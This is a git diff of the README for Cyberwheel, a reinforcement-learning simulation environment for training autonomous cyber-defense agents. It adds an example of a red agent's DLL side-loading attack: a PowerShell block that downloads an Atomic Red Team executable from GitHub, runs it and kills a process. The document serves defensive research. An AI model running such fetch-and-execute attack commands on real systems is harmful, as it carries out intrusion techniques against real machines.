@@ -1,13 +1,5 @@
 <a id="readme-top"></a>
 
-<!-- PROJECT SHIELDS -->
-<!--
-*** I'm using markdown "reference style" links for readability.
-*** Reference links are enclosed in brackets [ ] instead of parentheses ( ).
-*** See the bottom of this document for the declaration of the reference variables
-*** for contributors-url, forks-url, etc. This is an optional, concise syntax you may use.
-*** https://www.markdownguide.org/basic-syntax/#reference-style-links
--->
 [![Issues][issues-shield]][issues-url]
 [![MIT License][license-shield]][license-url]
 
@@ -35,7 +27,7 @@
   <summary>Table of Contents</summary>
   <ol>
     <li>
-      <a href="#about-the-project">About The Project</a>
+      <a href="#about-cyberwheel">About Cyberwheel</a>
       <ul>
         <li><a href="#built-with">Built With</a></li>
       </ul>
@@ -48,17 +40,14 @@
       </ul>
     </li>
     <li><a href="#usage">Usage</a></li>
-    <li><a href="#roadmap">Roadmap</a></li>
-    <li><a href="#contributing">Contributing</a></li>
     <li><a href="#license">License</a></li>
-    <li><a href="#contact">Contact</a></li>
-    <li><a href="#acknowledgments">Acknowledgments</a></li>
+    <li><a href="#contacts">Contacts</a></li>
   </ol>
 </details>
 
 ## About Cyberwheel
 
-<!-- TODO: Add a screenshot of the Visualizer!!!!! -->
+<!-- TODO: What would be a good project image? -->
 <!-- ![Cyberwheel Screenshot](images/screenshot.png "Cyberwheel Evaluation Visualizer") -->
 
 Cyberwheel is a Reinforcement Learning (RL) simulation environment built for training and evaluating autonomous cyber defense models on simulated networks. It was built with modularity in mind, to allow users to build on top of it to fit their needs. It supports various robust configuration files to build networks, services, host types, defensive agents, and more.
@@ -89,23 +78,20 @@ This environment contains a training script and evaluation script with a large s
 
 This project runs on, and has been tested with, Python 3.10. Once installed, poetry should automatically use this version for its virtual environment.
 
+* poetry
+Cyberwheel uses poetry to manage and install python packages. For instructions on how to install poetry, visit their [installation page](https://python-poetry.org/docs/#installation).
+
 * graphviz
 
 For the dash server visualization to function, you need graphviz, an open source graph visualization software, installed on your system.
 
 Instructions for installing graphviz can be found in their [documentation](https://graphviz.org/download/).
 
-*On newer OSX systems running on silicone chips, there may be an error with installing the `pygraphviz` package not finding the graphviz configuration files. (DOCUMENT WORKAROUND)*
-
 ### Installation
 
-When graphviz is installed, you can run
+Once all dependencies are installed:
 
-This installs all packages in pyproject.toml and resolves any dependencies.
-
-Once all packages are installed, you can just run
-
-1. Clone the cyberwheel repo with HTTPS:
+1. If you haven't already, clone the cyberwheel repo with HTTPS
    ```sh
    git clone https://github.com/ORNL/cyberwheel.git
    ```
@@ -118,6 +104,8 @@ Once all packages are installed, you can just run
     poetry install
     ```
 
+*On newer OSX systems running on silicone chips, there may be an error installing the `pygraphviz` package, with poetry not finding the graphviz configuration files. You can work around this by pip installing the pygraphviz package manually, explicitly passing graphviz config paths. [This link](https://stackoverflow.com/questions/69970147/how-do-i-resolve-the-pygraphviz-error-on-mac-os) helped me work through this issue.*
+
 <p align="right">(<a href="#readme-top">back to top</a>)</p>
 
 <!-- USAGE EXAMPLES -->
@@ -127,7 +115,7 @@ To run any cyberwheel scripts, shell into the poetry virtual environment
 ```sh
 poetry shell
 ```
-When you want to deactivate the environment, you can just hit Ctrl+D. This will exit the virtual environment.
+When you want to deactivate the environment, you can just hit Ctrl+D. This will exit the virtual environment shell.
 
 ### Training a model
 
@@ -257,44 +245,44 @@ The blue agent is largely focused on deploying Decoys to slow and/or stop red ag
 
 The red agent is a heuristic agent that has a set of defined rules and strategies that it can use to traverse a network, although its behavior to dictate which Hosts it chooses to target is modular. It's actions are mapped from MITRE ATT&CK Killchain Phases (Discovery, Lateral Movement, Privilege Escalation, Impact) to Atomic Red Team (ART) techniques. We've defined these techniques with a set of attributes mapped from existing cyber attack data. This allows our ART Agent to run a higher level killchain phase (i.e. discovery) on a host, and the environment will cross-
 reference the target host's attributes with ART Technique attributes techniques are valid for the attack by checking:
-  - [ ] Technique includes the target host's OS in supported platforms
-  - [ ] Technique includes the killchain phase in its supported killchain phases
-  - [ ] Technique can exploit any CVE that is present on the target host
-
-The ART Technique includes Atomic Tests, which give tangible commands to run in order to execute the given attack. With this
-methodology, the simulator is able to transform a general killchain phase into a valid set of commands that could be run in
+  - [x] Technique includes the target host's OS in supported platforms
+  - [x] Technique includes the killchain phase in its supported killchain phases
+  - [x] Technique can exploit any CVE that is present on the target host
+If all of these conditions are met, the agent can successfully run the killchain attack on the host. These ART Techniques include Atomic Tests, which give tangible commands to run in order to execute the given attack. With this methodology, the simulator is able to transform a general killchain phase into a valid set of commands that could be run in
 the real world.
 
-### Detectors and Alerts
+<ins> Example <ins>
 
+1. ART Agent runs `Privilege Escalation` on Host.
+2. ART Agent runs OS, Killchain Phase, and CVE checks.
+3. ART Agent uses ART Technique: DLL Side-Loading Technique
+4. ART Agent chooses a random Atomic Test
+5. Atomic Test adds the following commands to Host metadata:
+```sh
+New-Item -Type Directory (split-path "${gup_executable}") -ErrorAction ignore | Out-Null​
+Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574.002/bin/GUP.exe?raw=true" -OutFile "${gup_executable}"
+if (Test-Path "${gup_executable}") {exit 0} else {exit 1}​
+"${gup_executable}”​
+taskkill /F /IM ${process_name} >nul 2>&1​
+```
+
+### Detectors and Alerts
+Detector Info
 
 <!-- CONTRIBUTING -->
 ## Contributing
 
-Contributions are what make the open source community such an amazing place to learn, inspire, and create. Any contributions you make are **greatly appreciated**.
-
-If you have a suggestion that would make this better, please fork the repo and create a pull request. You can also simply open an issue with the tag "enhancement".
-Don't forget to give the project a star! Thanks again!
-
-1. Fork the Project
-2. Create your Feature Branch (`git checkout -b feature/AmazingFeature`)
-3. Commit your Changes (`git commit -m 'Add some AmazingFeature'`)
-4. Push to the Branch (`git push origin feature/AmazingFeature`)
-5. Open a Pull Request
-
-
 If you are not familiar with SOLID principles, please read this before contributing. Pretty basic, but makes a huge difference down the road --- [Article on SOLID](https://medium.com/@iclub-ideahub/the-solid-principles-a-guide-to-writing-maintainable-and-extensible-code-in-python-ecac4ea8d7ee).
 
-If you need to add dependency, this project is packaged with [poetry](https://python-poetry.org/). Please take a few minutes to [install](https://python-poetry.org/docs/#installation) and read about the [basics](https://python-poetry.org/docs/basic-usage/#specifying-dependencies) before adding any dependencies. Do not use pip, do not use requirements.txt. TLDR: use `poetry add <dependcy name>`. After adding your dependency, add and commit the new `poetry.lock` file.
+If you need to add dependency, this project is packaged with [poetry](https://python-poetry.org/). Please take a few minutes to read about the [basics](https://python-poetry.org/docs/basic-usage/#specifying-dependencies) before adding any dependencies. Do not use pip, do not use requirements.txt. TLDR: use `poetry add <dependency name>`. After adding your dependency, add and commit the new `poetry.lock` file.
 
-This project uses pre-commit to automatically run formatting prior to every commit. Pyright is included in this suite and _will_ block your commit if you commit code with bad type labels. If you'd like to skip this check for a WIP commit or some other reason, run `SKIP=pyright git commit <rest of commit command>`.
+This project uses pre-commit to automatically run formatting prior to every commit. Pyright is included in this suite and _will_ block your commit if you commit code with bad type labels. If you'd like to skip this check, run `SKIP=pyright git commit <rest of commit command>`.
 
 If you need to do anything with the networkx graph, write helper functions in the network module (base class where possible) rather than passing the graph around / injecting it wherever possible. Of course you may have to inject the network instance since it holds the state information.
 
 The cyberwheel class that inherits from gym should contain minimal code to keep it clean. If you find yourself writing long code blocks in this file, consider whether they should be moved into another module or class. The same thing goes for the main class --- keep it clean. If you want to add 30 command line args, maybe find a way to parse them using a helper class just to keep that file clean.
 
 Be creative and have fun!
-
 
 <p align="right">(<a href="#readme-top">back to top</a>)</p>
 
